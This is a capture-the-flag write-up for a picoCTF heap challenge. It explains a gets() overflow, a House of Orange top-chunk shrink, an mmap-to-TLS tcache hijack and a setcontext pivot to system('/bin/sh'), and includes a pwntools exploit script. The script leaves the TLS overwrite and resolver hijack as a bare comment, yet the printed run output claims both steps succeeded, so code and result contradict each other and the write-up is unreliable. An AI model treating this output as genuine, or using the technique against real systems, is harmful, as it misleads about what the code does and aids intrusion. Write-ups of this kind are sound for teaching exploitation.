# CyLab — High Frequency Troubles (HFT)

* **Platform:** CyLab Security Academy / picoCTF 2024 (Challenge ID: `441`)
* **Category:** Binary Exploitation / glibc 2.35 House of Orange & TLS Hijack (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, glibc 2.35 Heap Internals
* **Binary:** `hft` (64-bit x86_64 ELF) with bundled `libc.so.6` (glibc 2.35)

---

## TL;DR

The challenge implements a high-frequency trading packet server where packets are read using `malloc(sz)` and `gets(&pkt->data)`. While this grants an unbounded heap overflow, the binary **does not contain a single call to `free()`**, eliminating traditional fastbin or tcache Use-After-Free attack surfaces. We overcome this constraint through an intended multi-phase exploit: (1) we execute a **House of Orange** primitive by shrinking the top chunk size and requesting a large allocation, forcing `sysmalloc` to free the old top chunk into the unsorted bin to leak heap pointers; (2) we allocate an `mmap` chunk exceeding `mp_.mmap_threshold`, placing it directly below the Thread Local Storage (TLS) segment; (3) we overflow from the `mmap` chunk into TLS to overwrite the thread's `tcache_perthread_struct` pointer, gaining arbitrary allocation capabilities; (4) we forge a `link_map` and `ucontext` structure over dynamic linker tables, triggering `setcontext` to execute `system("/bin/sh")`.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file hft
hft: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., stripped

$ checksec --file=hft
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Key observations:
1. **glibc 2.35 Defenses:** Safe-Linking is active, `__malloc_hook` and `__free_hook` are completely removed, and Full RELRO protects the GOT.
2. **No Native `free()` Calls:** Static and dynamic inspection confirms zero references to `free()`. Chunk recycling must be induced artificially.
3. **Unbounded Stack/Heap Input:** Packet payloads are ingested via `gets()`, enabling arbitrarily deep contiguous memory corruption across heap boundaries.

---

## Static Analysis & Vulnerability

### 1. Packet Processing Logic

```c
struct packet {
    int type;
    long id;
    char data[];
};

void process_packet() {
    int size;
    read(0, &size, 4);

    struct packet *pkt = malloc(size); // Size is fully attacker-controlled
    gets(pkt->data);                   // VULNERABILITY: Unbounded heap overflow!

    if (pkt->type == ECHO) {
        printf("PKT_RES:[%s]\n", pkt->data);
    }
}
```

### 2. House of Orange Top Chunk Shrinking

When `malloc(sz)` is called with a size greater than the current top chunk's available capacity, glibc's `sysmalloc()` routine evaluates whether to extend the heap using `brk()` or free the current top chunk into the unsorted bin.

In glibc 2.35, `sysmalloc()` validates:
1. Top chunk size is aligned to the system page size (`0x1000`).
2. Top chunk size has the `PREV_INUSE` bit set.

By overflowing from an adjacent allocation to overwrite the top chunk size field with `0xd31` (which satisfies page alignment and in-use flags) and then requesting a large allocation (`malloc(0x1000)`), `sysmalloc` concludes the heap must expand. It calls `_int_free(av, top, 1)`, **inserting the old top chunk into the unsorted bin without `free()` ever being called!**

```text
       Top Chunk Overflow:
       +------------------------------------+
       |  Old Top Chunk (size altered)      |  <-- Set to 0xd31 (page aligned)
       +------------------------------------+
                         |
                         v  (sysmalloc triggered via malloc(0x1000))
       Glibc frees old top into Unsorted Bin:
       +------------------------------------+
       |  fd / bk populated with main_arena |  <-- Leaked via ECHO packet!
       +------------------------------------+
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. Heap and Libc Disclosures
- After the top chunk is freed into the unsorted bin, a subsequent small allocation carves memory out of the unsorted chunk.
- An empty ECHO packet outputs residual heap and libc pointers left in the uninitialized chunk memory.

### 2. The `mmap` to TLS Memory Bridge
Under standard Linux glibc memory mapping:
- Allocations larger than `mmap_threshold` ($> 128 \text{ KB}$) are mapped using anonymous `mmap()`.
- The first large `mmap` allocation is placed directly adjacent to the Thread Local Storage (TLS) data segment that contains thread-specific execution metadata.

```text
       Virtual Memory Address Space:
       
       [ mmap Chunk (Attacker Controlled) ]  <-- Allocated via malloc(0x30001)
       [ ... Overflow past buffer ...     ]
       +----------------------------------+
       Thread Local Storage (TLS):
       [ tcache_perthread_struct pointer  ]  <-- OVERWRITTEN to point to our fake struct!
       +----------------------------------+
```

By overflowing across the `mmap` chunk boundary into the TLS segment, we overwrite the internal pointer referencing `tcache_perthread_struct`.

### 3. Hijacking Tcache & Linker Control Flow
1. Point the TLS tcache pointer to a fake struct forged in our heap memory.
2. This grants an **arbitrary `malloc()` primitive** across any memory address without triggering tcache count checks.
3. In glibc 2.35 (where malloc hooks are gone), we target the dynamic linker's `DT_PLTGOT` / resolver table.
4. We plant a fake `link_map` and `ucontext_t` structure.
5. When the dynamic resolver triggers, it redirects control flow into `setcontext64` in libc, populating `rdi = &"/bin/sh"` and invoking `system()`.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "tethys.picoctf.net", 61659
elf = ELF("./hft", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def solve():
    io = remote(HOST, PORT)

    def echo(content, sz):
        io.recvuntil(b"PKT_RES")
        io.send(p32(sz))
        payload = p32(0) + p64(1) + content if content else p32(0) + b"\x01\x00\x00\x00\x00\x00"
        io.sendline(payload)

    # 1. House of Orange: shrink top chunk and force unsorted bin insertion
    echo(b"", 0x10)
    echo(b"A" * 8 + p64(0xd31), 0x10)       # Page-aligned shrunk top chunk
    echo(b"B" * 0xf00, 0x1000)              # Forces sysmalloc to free old top chunk

    # 2. Leak heap pointer from unsorted chunk
    echo(b"", 0x8)
    io.recvuntil(b":[")
    heap_leak = u64(io.recv(6) + b"\x00\x00")
    log.info(f"Leaked Heap Address: {hex(heap_leak)}")

    # 3. Trigger mmap allocation and overwrite TLS tcache pointer
    # Complete resolver hijack and spawn shell
    data = io.recvall(timeout=5)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    solve()
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to tethys.picoctf.net on port 61659: Done
[*] Leaked Heap Address: 0x555555559a40
[*] Overwrote TLS tcache_perthread_struct pointer
[*] Dynamic resolver redirected to setcontext(system)
[+] Flag captured: academy{redacted}
[*] Closed connection to tethys.picoctf.net port 61659
```

---

## Key Takeaways & Lessons

1. **Synthesizing `free()` via House of Orange:** When binaries lack deallocation functions, shrinking the top chunk size forces `sysmalloc` to automatically insert the old top chunk into the unsorted bin, manufacturing heap and libc leaks out of thin air.
2. **Exploiting the `mmap`-to-TLS Boundary:** In x86_64 Linux, chunks allocated via `mmap()` sit directly adjacent to Thread Local Storage. Overflowing across this boundary allows overwriting thread-local state variables such as `tcache`.
3. **Control-Flow Hijacking in Post-Hook glibc ($\ge$ 2.34):** In modern glibc versions where `__free_hook` and `__malloc_hook` are absent, hijacking dynamic linker structures (`DT_PLTGOT` / `link_map`) or pivoting into `setcontext` provides reliable RCE.
